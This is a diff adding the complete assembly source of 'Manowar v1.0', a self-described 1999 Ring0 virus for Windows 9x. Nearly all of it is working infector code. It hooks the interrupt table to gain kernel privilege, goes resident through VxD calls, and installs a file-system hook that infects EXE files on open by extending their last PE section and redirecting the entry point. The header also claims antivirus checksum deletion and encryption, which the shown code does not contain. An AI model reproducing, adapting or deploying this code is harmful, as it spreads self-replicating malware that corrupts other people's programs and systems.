@@ -1,0 +1,673 @@
+comment $
+
+                                 Lord Julus
+
+    ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ( proudly presents )ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+    ÛÛÛ»   ÛÛÛ»  ÛÛÛÛÛ»  ÛÛÛ»   ÛÛ»  ÛÛÛÛÛÛ»  ÛÛ»    ÛÛ»  ÛÛÛÛÛ»  ÛÛÛÛÛÛ»
+    ÛÛÛÛ» ÛÛÛÛº ÛÛÉÍÍÛÛ» ÛÛÛÛ»  ÛÛº ÛÛÉÍÍÍÛÛ» ÛÛº    ÛÛº ÛÛÉÍÍÛÛ» ÛÛÉÍÍÛÛ»
+    ÛÛÉÛÛÛÛÉÛÛº ÛÛÛÛÛÛÛº ÛÛÉÛÛ» ÛÛº ÛÛº   ÛÛº ÛÛº Û» ÛÛº ÛÛÛÛÛÛÛº ÛÛÛÛÛÛÉ¼
+    ÛÛºÈÛÛÉ¼ÛÛº ÛÛÉÍÍÛÛº ÛÛºÈÛÛ»ÛÛº ÛÛº   ÛÛº ÛÛºÛÛÛ»ÛÛº ÛÛÉÍÍÛÛº ÛÛÉÍÍÛÛ»
+    ÛÛº ÈÍ¼ ÛÛº ÛÛº  ÛÛº ÛÛº ÈÛÛÛÛº ÈÛÛÛÛÛÛÉ¼ ÈÛÛÛÉÛÛÛÉ¼ ÛÛº  ÛÛº ÛÛº  ÛÛº
+    ÈÍ¼     ÈÍ¼ ÈÍ¼  ÈÍ¼ ÈÍ¼  ÈÍÍÍ¼  ÈÍÍÍÍÍ¼   ÈÍÍ¼ÈÍÍ¼  ÈÍ¼  ÈÍ¼ ÈÍ¼  ÈÍ¼
+
+    ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ(       v 1.0      )ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+         This is my first attempt to a Ring0 virus. I would like to take a
+     minute  and  thank  Blue Skull/[SLAM] for his SEH and Ring0 ideas and
+     Super/[29A] for his Ring0 and VxD ideas. Also, tremendous thanx go to
+     Quantum  for  his  Fuck  Harry  and  Next  Step viruses. Also for the
+     creator  of  CIH.  As I always say: there is always somebody to learn
+     from...  I  don't know if I'll get a chance to download the DDK98 but
+     until  then  I'll try to do my best with all the docs I already have.
+     Anyway,  this  virus is supposed to go to Ring0, go resident by using
+     the  GetHeap  VxD  call,  install  there a FileSystemAPIhook and trap
+     files  on open, after that infecting them. The virus tries to protect
+     itself  from  exception  errors using a SEH frame that sends the code
+     back to the host if an exception error occurs. Also, everytime a file
+     get's  infected,  it's path is scanned for AV checksum files. If they
+     are  found  they get deleted. The appending method is the increase of
+     the last section. In this version the virus is encrypted with a small
+     decryption routine. I sure hope I will improve this one...
+
+                                             ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+                                             ³  Lord Julus - 1999  ³
+                                             ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+
+        $
+
+;=====( Manowar v.1.0 )======================================================
+
+.386p                                        ; stuff...
+.model flat, stdcall                         ;
+jumps                                        ;
+
+;=====( Externals )==========================================================
+
+extrn ExitProcess:PROC                       ;
+
+;=====( Macros )=============================================================
+
+vxdcall macro vxd_id, service_id             ; These are macros used to
+      int 20h                                ; call a VxD service or...
+      dw service_id                          ;
+      dw vxd_id                              ;
+endm                                         ;
+
+;=====( Equates )============================================================
+
+FALSE                    = 0                 ;
+TRUE                     = 1                 ;
+DEBUG                    = TRUE              ;
+IFSMgr                   = 0040h             ;
+GetHeap                  = 000dh             ;
+InstallFileSystemAPIhook = 0067h             ;
+Ring0_FileIO             = 0032h             ;
+UniToBCSPath             = 0041h             ;
+IFSFN_OPEN               = 36                ; open file
+R0_OPENCREATFILE         = 0D500h            ; Open/Create a file
+R0_OPENCREAT_IN_CONTEXT  = 0D501h            ; Open/Create file in crt context
+R0_READFILE              = 0D600h            ; Read a file, no context
+R0_WRITEFILE             = 0D601h            ; Write to a file, no context
+R0_READFILE_IN_CONTEXT   = 0D602h            ; Read a file, in thread context
+R0_WRITEFILE_IN_CONTEXT  = 0D603h            ; Write to a file, in thread context
+R0_CLOSEFILE             = 0D700h            ; Close a file
+R0_GETFILESIZE           = 0D800h            ; Get size of a file
+R0_FINDFIRSTFILE         = 04E00h            ; Do a LFN FindFirst operation
+R0_FINDNEXTFILE          = 04F00h            ; Do a LFN FindNext operation
+R0_FINDCLOSEFILE         = 0DC00h            ; Do a LFN FindClose operation
+R0_FILEATTRIBUTES        = 04300h            ; Get/Set Attributes of a file
+GET_ATTRIBUTES           = 00h               ;
+SET_ATTRIBUTES           = 01h               ;
+R0_RENAMEFILE            = 05600h            ; Rename a file
+R0_DELETEFILE            = 04100h            ; Delete a file
+R0_LOCKFILE              = 05C00h            ; Lock/Unlock a region in a file
+R0_GETDISKFREESPACE      = 03600h            ; Get disk free space
+R0_READABSOLUTEDISK      = 0DD00h            ; Absolute disk read
+R0_WRITEABSOLUTEDISK     = 0DE00h            ; Absolute disk write
+SEH                      = TRUE              ;
+if DEBUG                                     ;
+   PAYLOAD               = FALSE             ;
+   exception_int         = 5                 ;
+   exe_ext               = 'EXE.'            ; you can put smth. else here
+else                                         ;
+   PAYLOAD               = TRUE              ;
+   exception_int         = 3                 ;
+   exe_ext               = 'EXE.'            ;
+endif                                        ;
+                                             ;
+virussize                = end-start         ;
+
+;=====( Dummy data )========================================================
+
+.data                                        ;
+  db 0                                       ;
+
+;=====( Code )==============================================================
+
+.code                                        ;
+                                             ;
+start:                                       ;
+       call get_delta                        ;
+                                             ;
+get_delta:                                   ;
+       pop ebp                               ;
+       sub ebp, offset get_delta             ;
+       jmp realstart                         ; jump over data
+                                             ;
+copyright        db "Manowar v.1.0 - a ring 0 virus"
+                 db "written by Lord Julus (c) 1999"
+IDT_Address      dq 0                        ; IDT address
+exception        dd 0                        ; exception place
+old_offset       dd 0                        ; real old offset
+flag             db 0                        ; infection flag
+newaddress       dd 0                        ; new virus place
+filename         db 260 dup (0)              ; victim's name
+handle           dd 0                        ; victim's handle
+crt_move         dd 0                        ; current movement in file
+sec_ptr          dd 0                        ; pointer to section
+Old_EIP          dd 0                        ; Old Entry point
+S_Align          dd 0                        ; section alignment
+F_Align          dd 0                        ; file alignment
+SOI              dd 0                        ; size of image
+peheader         dd 0                        ; pe header address
+virusplace       dd 0                        ; virus place in victim
+imagebase        dd 0                        ; imagebase of victim
+                                             ;
+if SEH                                       ;
+SEH_oldpointer   dd ?                        ; SEH saved pointer
+SEH_nextpointer  dd ?                        ; SEH structure... old pointer
+SEH_errorhandler dd ?                        ;                  new pointer
+endif                                        ;
+
+;=====( File header structures )=============================================
+
+IMAGE_DOS_HEADER STRUC            ; DOS .EXE header
+    MZ_magic      DW ?            ; Magic number
+    MZ_cblp       DW ?            ; Bytes on last page of file
+    MZ_cp         DW ?            ; Pages in file
+    MZ_crlc       DW ?            ; Relocations
+    MZ_cparhdr    DW ?            ; Size of header in paragraphs
+    MZ_minalloc   DW ?            ; Minimum extra paragraphs needed
+    MZ_maxalloc   DW ?            ; Maximum extra paragraphs needed
+    MZ_ss         DW ?            ; Initial (relative) SS value
+    MZ_sp         DW ?            ; Initial SP value
+    MZ_csum       DW ?            ; Checksum
+    MZ_ip         DW ?            ; Initial IP value
+    MZ_cs         DW ?            ; Initial (relative) CS value
+    MZ_lfarlc     DW ?            ; File address of relocation table
+    MZ_ovno       DW ?            ; Overlay number
+    MZ_res        DW 4 DUP(?)     ; Reserved words
+    MZ_oemid      DW ?            ; OEM identifier (for MZ_oeminfo)
+    MZ_oeminfo    DW ?            ; OEM information; MZ_oemid specific
+    MZ_res2       DW 10 DUP(?)    ; Reserved words
+    MZ_lfanew     DD ?            ; File address of new exe header
+IMAGE_DOS_HEADER ENDS             ;
+IMAGE_DOS_HEADER_SIZE = SIZE IMAGE_DOS_HEADER
+                                  ;
+IMAGE_FILE_HEADER STRUC           ; Portable Exe File
+    PE_Magic                 DD ? ;
+    Machine                  DW ? ; Machine type
+    NumberOfSections         DW ? ; Number of sections
+    TimeDateStamp            DD ? ; Date and Time
+    PointerToSymbolTable     DD ? ; Pointer to Symbols
+    NumberOfSymbols          DD ? ; Number of Symbols
+    SizeOfOptionalHeader     DW ? ; Size of Optional Header
+    Characteristics          DW ? ; File characteristics
+IMAGE_FILE_HEADER ENDS            ;
+IMAGE_FILE_HEADER_SIZE = SIZE IMAGE_FILE_HEADER
+
+IMAGE_DATA_DIRECTORY STRUC                         ; Image data directory
+    DD_VirtualAddress DD ?                         ; Virtual address
+    DD_Size           DD ?                         ; Virtual size
+IMAGE_DATA_DIRECTORY ENDS                          ;
+                                                   ;
+IMAGE_DIRECTORY_ENTRIES STRUC                      ; All directories
+    DE_Export           IMAGE_DATA_DIRECTORY    ?  ;
+    DE_Import           IMAGE_DATA_DIRECTORY    ?  ;
+    DE_Resource         IMAGE_DATA_DIRECTORY    ?  ;
+    DE_Exception        IMAGE_DATA_DIRECTORY    ?  ;
+    DE_Security         IMAGE_DATA_DIRECTORY    ?  ;
+    DE_BaseReloc        IMAGE_DATA_DIRECTORY    ?  ;
+    DE_Debug            IMAGE_DATA_DIRECTORY    ?  ;
+    DE_Copyright        IMAGE_DATA_DIRECTORY    ?  ;
+    DE_GlobalPtr        IMAGE_DATA_DIRECTORY    ?  ;
+    DE_TLS              IMAGE_DATA_DIRECTORY    ?  ;
+    DE_LoadConfig       IMAGE_DATA_DIRECTORY    ?  ;
+    DE_BoundImport      IMAGE_DATA_DIRECTORY    ?  ;
+    DE_IAT              IMAGE_DATA_DIRECTORY    ?  ;
+IMAGE_DIRECTORY_ENTRIES ENDS                       ;
+IMAGE_NUMBEROF_DIRECTORY_ENTRIES = 16              ;
+                                                   ;
+IMAGE_OPTIONAL_HEADER STRUC                        ; Optional Header
+    OH_Magic                        DW ?           ; Magic word
+    OH_MajorLinkerVersion           DB ?           ; Major Linker version
+    OH_MinorLinkerVersion           DB ?           ; Minor Linker version
+    OH_SizeOfCode                   DD ?           ; Size of code section
+    OH_SizeOfInitializedData        DD ?           ; Initialized Data
+    OH_SizeOfUninitializedData      DD ?           ; Uninitialized Data
+    OH_AddressOfEntryPoint          DD BYTE PTR ?  ; Initial EIP
+    OH_BaseOfCode                   DD BYTE PTR ?  ; Code Virtual Address
+    OH_BaseOfData                   DD BYTE PTR ?  ; Data Virtual Address
+    OH_ImageBase                    DD BYTE PTR ?  ; Base of image
+    OH_SectionAlignment             DD ?           ; Section Alignment
+    OH_FileAlignment                DD ?           ; File Alignment
+    OH_MajorOperatingSystemVersion  DW ?           ; Major OS
+    OH_MinorOperatingSystemVersion  DW ?           ; Minor OS
+    OH_MajorImageVersion            DW ?           ; Major Image version
+    OH_MinorImageVersion            DW ?           ; Minor Image version
+    OH_MajorSubsystemVersion        DW ?           ; Major Subsys version
+    OH_MinorSubsystemVersion        DW ?           ; Minor Subsys version
+    OH_Win32VersionValue            DD ?           ; win32 version
+    OH_SizeOfImage                  DD ?           ; Size of image
+    OH_SizeOfHeaders                DD ?           ; Size of Header
+    OH_CheckSum                     DD ?           ; unused
+    OH_Subsystem                    DW ?           ; Subsystem
+    OH_DllCharacteristics           DW ?           ; DLL characteristic
+    OH_SizeOfStackReserve           DD ?           ; Stack reserve
+    OH_SizeOfStackCommit            DD ?           ; Stack commit
+    OH_SizeOfHeapReserve            DD ?           ; Heap reserve
+    OH_SizeOfHeapCommit             DD ?           ; Heap commit
+    OH_LoaderFlags                  DD ?           ; Loader flags
+    OH_NumberOfRvaAndSizes          DD ?           ; Number of directories
+                                    UNION          ; directory entries
+    OH_DataDirectory                IMAGE_DATA_DIRECTORY\
+                                    IMAGE_NUMBEROF_DIRECTORY_ENTRIES DUP (?)
+    OH_DirectoryEntries             IMAGE_DIRECTORY_ENTRIES ?
+                                    ENDS           ;
+    ENDS                                           ;
+IMAGE_OPTIONAL_HEADER_SIZE = SIZE IMAGE_OPTIONAL_HEADER
+                                                   ;
+IMAGE_SECTION_HEADER STRUC                         ; Section hdr.
+    SH_Name                 DB 8 DUP(?)            ; name
+                            UNION                  ;
+    SH_PhysicalAddress      DD BYTE PTR ?          ; Physical address
+    SH_VirtualSize          DD ?                   ; Virtual size
+                            ENDS                   ;
+    SH_VirtualAddress       DD BYTE PTR ?          ; Virtual address
+    SH_SizeOfRawData        DD ?                   ; Raw data size
+    SH_PointerToRawData     DD BYTE PTR ?          ; pointer to raw data
+    SH_PointerToRelocations DD BYTE PTR ?          ; ...
+    SH_PointerToLinenumbers DD BYTE PTR ?          ; ...... not really used
+    SH_NumberOfRelocations  DW ?                   ; ....
+    SH_NumberOfLinenumbers  DW ?                   ; ..
+    SH_Characteristics      DD ?                   ; flags
+IMAGE_SECTION_HEADER ENDS                          ;
+IMAGE_SECTION_HEADER_SIZE = SIZE IMAGE_SECTION_HEADER
+                                                   ;
+my_mz_header IMAGE_DOS_HEADER      ?               ; our real data comes
+my_pe_header IMAGE_FILE_HEADER     ?               ; here...
+my_oh_header IMAGE_OPTIONAL_HEADER ?               ;
+my_section   IMAGE_SECTION_HEADER  ?               ;
+
+;=====( Real code start )====================================================
+                                             ;
+realstart:                                   ;
+       if SEH                                ;
+       mov eax, dword ptr fs:[00H]           ; get the old seh pointer
+       mov dword ptr [ebp+SEH_nextpointer], eax; set in structure
+       mov dword ptr [ebp+SEH_oldpointer], eax ; and save for restore
+       lea eax, [ebp+return_to_host]         ; make it point here...
+       mov dword ptr [ebp+SEH_errorhandler], eax;
+       lea eax, [ebp+SEH_nextpointer]        ;
+       mov dword ptr fs:[00H], eax           ; and point the structure
+       endif                                 ;
+                                             ;
+       sidt [ebp+IDT_Address]                ; Get interrupt address
+       mov esi, dword ptr [ebp+IDT_Address+2]; (first 2 are the length)
+       add esi, exception_int*8              ; get the offset for Int
+       mov dword ptr [ebp+exception], esi    ; save exception place
+       mov bx, word ptr [esi+6]              ; get low word
+       shl ebx, 10H                          ; shift left
+       mov bx, word ptr [esi]                ; get high word
+       mov dword ptr [ebp+old_offset], ebx   ; save exception offset
+       lea eax, [ebp+offset Ring0]           ; eax=new Int handler
+       mov word ptr [esi], ax                ; store high word
+       shr eax, 10H                          ; shift right
+       mov word ptr [esi+6], ax              ; and store low word
+                                             ;
+       mov eax, 0c000e990h                   ; check residency mark...
+       cmp dword ptr [eax], 'MWAR'           ;
+       jne go_on_to_ring0                    ;
+       jmp already_installed                 ;
+                                             ;
+go_on_to_ring0:                              ;
+       int exception_int                     ; Generate exception -> Ring0 !
+                                             ;
+already_installed:                           ;
+       mov esi, dword ptr [ebp+exception]    ; restore IDT address
+       mov ebx, dword ptr [ebp+old_offset]   ; restore exception offset
+       mov word ptr [esi], bx                ; restore exception
+       shr ebx, 10H                          ; handler
+       mov word ptr [esi+6], bx              ;
+                                             ;
+return_to_host:                              ;
+       if SEH                                ;
+       mov eax, dword ptr [ebp+SEH_oldpointer]; restore the old SEH pointer
+       mov dword ptr fs:[00H], eax           ;
+       endif                                 ;
+                                             ;
+exit:                                        ;
+       cmp ebp, 0                            ;
+       je generation_1                       ;
+       mov eax, [ebp+Old_EIP]                ;
+       add eax, [ebp+imagebase]              ;
+       jmp eax                               ;
+                                             ;
+generation_1:                                ;
+       Push 0                                ;
+       Call ExitProcess                      ; and exit
+
+;=====( Ring 0 stuff )=======================================================
+
+Ring0 proc                                   ; Here we are at Ring0
+       pushad                                ; save registers
+       mov eax, end-start+100                ; memory needed
+       push eax                              ;
+                                             ;
+fix_1_value equ GetHeap+256*256*IFSMgr       ; fix dword for GetHeap
+fix_1:                                       ;
+       vxdcall IFSMgr, GetHeap               ; get it!
+       pop ecx                               ; in ecx...
+       or eax, eax                           ; did we make it?
+       jz no_free_mem                        ;
+                                             ;
+       xchg eax, edi                         ; EDI = new free memory area
+       lea esi, dword ptr [ebp+start]        ; ESI = start of virus
+       push edi                              ;
+       mov ecx, end-start                    ;
+       rep movsb                             ; copy virus...
+       pop edi                               ;
+       mov dword ptr [ebp+newaddress], edi   ;
+       mov dword ptr [edi+delta1-start], edi ;
+                                             ;
+       lea eax, [edi+API_hook-start]         ; FSAPI hook
+       push eax                              ;
+                                             ;
+fix_2_value equ InstallFileSystemAPIhook+256*256*IFSMgr;
+fix_2:                                       ;
+       vxdcall IFSMgr, InstallFileSystemAPIhook; install new handler
+       pop ebx                               ; just to restore stack
+       mov [edi+nexthook-start], eax         ; save the old hook handler
+                                             ;
+       call beep                             ; debug beep
+                                             ;
+       jmp install_success                   ;
+                                             ;
+no_free_mem:                                 ;
+       jmp exit_to_ring3                     ;
+                                             ;
+install_success:                             ;
+       mov eax, 0c000e990h                   ; mark as resident
+       mov dword ptr [eax], 'MWAR'           ;
+       mov byte ptr [edi+flag-start], 0      ; reset flag
+                                             ;
+exit_to_ring3:                               ;
+       popad                                 ; restore regs
+       iretd                                 ; Get out of R0
+Ring0 endp                                   ;
+                                             ;
+
+;=====( Control gets here on file I/O )=====================================
+
+API_hook:                                    ;
+        push ebp                             ; C-like enter
+        mov ebp, esp                         ;
+                                             ;
+        sub esp, 20h                         ; get parametrs off stack
+                                             ;
+        push ebx                             ;
+        push esi                             ;
+        push edi                             ;
+                                             ;
+        db 0bfh                              ; EDI = new delta handle in mem
+delta1  dd 0                                 ;
+                                             ;
+        cmp byte ptr [edi+flag-start], 1     ; safety flag (prevents reentry)
+        je over_now                          ;
+                                             ;
+        cmp dword ptr [ebp+12], IFSFN_OPEN   ; is this an openfile call ?
+        jne over_now                         ;
+                                             ;
+        mov byte ptr [edi+flag-start], 1     ; set our reentrance flag
+                                             ;
+        pusha                                ; push all regs
+                                             ;
+        lea esi, [edi+filename-start]        ;
+        mov eax, [ebp+16]                    ; get drive type (1=A)
+        cmp al, 0ffh                         ; bigger
+        je no_path                           ; then -> problem
+        add al, 40h                          ; align to ASCII
+        mov byte ptr [esi], al               ;
+        inc esi                              ;
+        mov byte ptr [esi], ':'              ;
+        inc esi                              ;
+        mov byte ptr [esi], '\'              ; we have a 'c:\' now...
+                                             ;
+no_path:                                     ;
+        push 0                               ; prepare for unicode conversion
+        push 260                             ; maximum filename
+        mov eax, [ebp+28]                    ; get IOREQ
+        mov eax, [eax+12]                    ;
+        add eax, 4                           ;
+        push eax                             ;
+        push esi                             ;
+                                             ;
+fix_3_value equ UniToBCSPath+256*256*IFSMgr  ;
+fix_3:                                       ;
+        vxdcall IFSMgr, UniToBCSPath         ; Convert name!!
+        add esp, 4*4                         ; restore stack
+        add esi, eax                         ; eax = length
+        mov byte ptr [esi], 0                ; make it ASCIIZ string
+                                             ;
+        if DEBUG                             ;
+        cmp dword ptr [esi-8], 'TAOG'        ; if debug is on search only
+        jne notexe                           ; for GOAT.XEX
+        endif                                ;
+        cmp dword ptr [esi-4], exe_ext       ;
+        jne notexe                           ;
+                                             ;
+        lea esi, [edi+filename-start]        ; let's open the file
+        mov bx, 2                            ;
+        mov cx, 0                            ;
+        mov dx, 1                            ;
+        mov eax, R0_OPENCREATFILE            ;
+        call Ring0_File_IO                   ;
+        jc notexe                            ;
+        mov dword ptr [edi+handle-start], eax; save handle
+                                             ;
+        call beep                            ; debug beep
+                                             ;
+        lea edx, [edi+my_mz_header-start]    ; read MZ dos header
+        mov ebx, dword ptr [edi+handle-start]; file handle
+        mov ecx, IMAGE_DOS_HEADER_SIZE       ; size of mz header
+        mov esi, 0                           ; pointer in file
+        mov eax, R0_READFILE                 ;
+        xchg esi, edx                        ;
+        call Ring0_File_IO                   ;
+                                             ;
+        lea esi, [edi+my_mz_header-start]    ;
+        mov ax, word ptr [esi.MZ_magic]      ; iz the Magic sign there?
+        cmp ax, 5A4Dh                        ;
+        jne fileclose                        ;
+                                             ;
+        mov esi, dword ptr [esi.MZ_lfanew]   ; locate PE header
+        cmp esi, 500h                        ; is PE header very far away?
+        ja fileclose                         ;
+                                             ;
+        mov dword ptr [edi+crt_move-start], esi ; save our movement in file
+        mov dword ptr [edi+peheader-start], esi ;
+                                             ;
+        lea edx, [edi+my_pe_header-start]    ; Read the PE header
+        mov ebx, dword ptr [edi+handle-start];
+        mov ecx, IMAGE_FILE_HEADER_SIZE+IMAGE_OPTIONAL_HEADER_SIZE
+        mov eax, R0_READFILE                 ;
+        xchg esi, edx                        ;
+        call Ring0_File_IO                   ;
+                                             ;
+        add dword ptr [edi+crt_move-start],\ ; increase our movement
+                      IMAGE_FILE_HEADER_SIZE +  \ ; in the file
+                      IMAGE_OPTIONAL_HEADER_SIZE  ;
+                                             ;
+        lea esi, [edi+my_pe_header-start]    ;
+        cmp dword ptr [esi.PE_Magic], 00004550h ; 'PE'/0/0 ?
+        jne fileclose                        ;
+                                             ;
+        cmp word ptr [esi.Characteristics], 2000h ; DLL?
+        je fileclose                         ;
+                                             ;
+                                             ; let's search the last section
+        xor eax, eax                         ; header start
+        mov ax, word ptr [esi.NumberOfSections]; EAX = HOW MANY SECTIONS
+        mov ecx, IMAGE_SECTION_HEADER_SIZE   ;   ECX = SIZE OF SECTION
+        dec eax                              ; looking for the last
+        mul ecx                              ; we found the displacement
+        mov esi, eax                         ; displacement
+        add esi, dword ptr [edi+crt_move-start]; align entire displacement
+        mov dword ptr [edi+sec_ptr-start], esi; save section header place
+                                             ;
+        lea edx, [edi+my_section-start]      ; read the last section
+        mov ecx, IMAGE_SECTION_HEADER_SIZE   ;
+        mov ebx, dword ptr [edi+handle-start];
+        xchg esi, edx                        ;
+        mov eax, R0_READFILE                 ;
+        call Ring0_File_IO                   ;
+                                             ;
+        lea esi, [edi+my_oh_header-start]    ; save various stuff in PE header
+
+        cmp dword ptr [esi.OH_Win32VersionValue], 'MWAR'; already?
+        je fileclose                                    ;
+
+        mov eax, dword ptr [esi.OH_SectionAlignment]    ; Section align
+        mov [edi+S_Align-start], eax                    ;
+        mov eax, dword ptr [esi.OH_FileAlignment]       ; File align
+        mov [edi+F_Align-start], eax                    ;
+        mov eax, dword ptr [esi.OH_AddressOfEntryPoint] ; Original EIP
+        mov [edi+Old_EIP-start], eax                    ;
+        mov eax, dword ptr [esi.OH_SizeOfImage]         ; Size of image
+        mov [edi+SOI-start], eax                        ;
+        mov eax, dword ptr [esi.OH_ImageBase]           ; Size of image
+        mov [edi+imagebase-start], eax                  ;
+
+
+        lea esi, [edi+my_section-start]      ; point the last section
+        mov eax, dword ptr [esi.SH_PointerToRawData];
+        add eax, dword ptr [esi.SH_VirtualSize] ;
+        mov dword ptr [edi+virusplace-start], eax
+        mov eax, dword ptr [esi.SH_SizeOfRawData] ;
+        add eax, virussize                   ;
+        mov ecx, dword ptr [edi+F_Align-start]; and align it to the file
+        push eax                             ; alignment
+        push ecx                             ;
+        xor edx, edx                         ;
+        div ecx                              ;
+        pop ecx                              ;
+        sub ecx, edx                         ;
+        pop eax                              ;
+        add eax, ecx                         ;
+        mov dword ptr [esi.SH_SizeOfRawData], eax ; and store it
+        mov eax, dword ptr [esi.SH_VirtualSize] ; and now increase VirtualSize
+        add eax, virussize                   ; with the virus length
+        mov dword ptr [esi.SH_VirtualSize], eax ;
+                                             ;
+        or dword ptr [esi.SH_Characteristics], 00000020h ; code
+        or dword ptr [esi.SH_Characteristics], 20000000h ; executable
+        or dword ptr [esi.SH_Characteristics], 80000000h ; writable
+                                             ;
+        lea esi, [edi+my_oh_header-start]    ; point PE header
+        mov eax, dword ptr [edi+SOI-start]   ; Get OldSizeOfImage
+        add eax, virussize                   ; increase it and then
+        mov ecx, dword ptr [edi+S_Align-start] ; align it to the section
+        push eax                             ; alignement
+        push ecx                             ;
+        xor edx, edx                         ;
+        div ecx                              ;
+        pop ecx                              ;
+        sub ecx, edx                         ;
+        pop eax                              ;
+        add eax, ecx                         ;
+        mov dword ptr [esi.OH_SizeOfImage], eax ;
+                                             ;
+        lea esi, [edi+my_section-start]      ; point section again
+        mov eax, dword ptr [esi.SH_VirtualAddress];
+        add eax, dword ptr [esi.SH_VirtualSize];
+        sub eax, virussize                   ;
+                                             ;
+        lea esi, [edi+my_oh_header-start]    ;
+        mov dword ptr [esi.OH_AddressOfEntryPoint], eax ;
+        mov dword ptr [esi.OH_Win32VersionValue], 'MWAR'; inf. marker...
+                                             ;
+        lea edx, [edi+my_section-start]      ; write section to file
+        mov ecx, IMAGE_SECTION_HEADER_SIZE   ;
+        mov ebx, dword ptr [edi+handle-start];
+        mov eax, R0_WRITEFILE                ;
+        mov esi, dword ptr [edi+sec_ptr-start];
+        xchg edx, esi                        ;
+        call Ring0_File_IO                   ;
+                                             ;
+        lea edx, [edi+my_pe_header-start]    ; write headers to file
+        mov ecx, IMAGE_FILE_HEADER_SIZE+\
+                 IMAGE_OPTIONAL_HEADER_SIZE  ;
+        mov ebx, dword ptr [edi+handle-start];
+        mov eax, R0_WRITEFILE                ;
+        mov esi, dword ptr [edi+peheader-start];
+        xchg edx, esi                        ;
+        call Ring0_File_IO                   ;
+
+; Before writing the virus body to the victim, we must restore the vxdcalls
+
+        mov cx, 20cdh                        ; The VxD call must look like
+        mov word ptr [edi+fix_1-start], cx   ; this:
+        mov eax, fix_1_value                 ;      Int 20h
+        mov dword ptr [edi+fix_1-start+2], eax ;    dw service
+        mov word ptr [edi+fix_2-start], cx   ;      dw vxd
+        mov eax, fix_2_value                 ;
+        mov dword ptr [edi+fix_2-start+2], eax ; Here we simply restore them
+        mov word ptr [edi+fix_3-start], cx   ; because at runtime they get
+        mov eax, fix_3_value                 ; changed to call [some address]
+        mov dword ptr [edi+fix_3-start+2], eax ;
+        mov word ptr [edi+fix_4-start], cx   ;
+        mov eax, fix_4_value                 ;
+        mov dword ptr [edi+fix_4-start+2], eax ;
+                                             ;
+        mov edx, edi                         ; write virus to file
+        mov ecx, virussize                   ;
+        mov ebx, dword ptr [edi+handle-start];
+        mov eax, R0_WRITEFILE                ;
+        mov esi, dword ptr [edi+virusplace-start];
+        xchg edx, esi                        ;
+        call Ring0_File_IO                   ;
+                                             ;
+fileclose:                                   ;
+        mov ebx, dword ptr [edi+handle-start];
+        mov eax, R0_CLOSEFILE                ;
+        call Ring0_File_IO                   ;
+                                             ;
+notexe:                                      ;
+        popa                                 ;
+                                             ;
+over_now:                                    ;
+        mov byte ptr [edi+flag-start], 0     ;
+        mov eax, [ebp+28]                    ; here we have the old params
+        push eax                             ; pushed for the old hook
+        mov eax, [ebp+24]                    ;
+        push eax                             ; restore them...
+        mov eax, [ebp+20]                    ;
+        push eax                             ;
+        mov eax, [ebp+16]                    ;
+        push eax                             ;
+        mov eax, [ebp+12]                    ;
+        push eax                             ;
+        mov eax, [ebp+8]                     ;
+        push eax                             ;
+                                             ;
+        db 0b8h                              ;
+nexthook dd 0                                ;
+        call [eax]                           ; ...and call old hook address
+                                             ;
+        add esp, 6*4                         ; restore stack
+                                             ;
+        pop edi                              ; restore regs
+        pop esi                              ;
+        pop ebx                              ;
+                                             ;
+        leave                                ; and flee...
+        ret                                  ;
+                                             ;
+fix_4_value equ Ring0_FileIO+256*256*IFSMgr  ;
+fix_4:                                       ;
+Ring0_File_IO:                               ;
+        vxdcall IFSMgr, Ring0_FileIO         ;
+        ret                                  ;
+                                             ;
+beep:
+       pushad
+       mov ax, 1000
+       mov bx, 200
+       mov cx, ax
+       mov al, 0b6h
+       out 43h, al
+       mov dx, 0012h
+       mov ax, 34dch
+       div cx
+       out 42h, al
+       mov al, ah
+       out 42h, al
+       in al, 61h
+       mov ah, al
+       or al, 03h
+       out 61h, al
+       l1:
+       mov ecx, 4680
+       l2:
+       loop l2
+       dec bx
+       jnz l1
+       mov al, ah
+       out 61h, al
+       popad
+       ret
+                                             ;
+end:                                         ;
+end start                                    ;
+end                                          ;
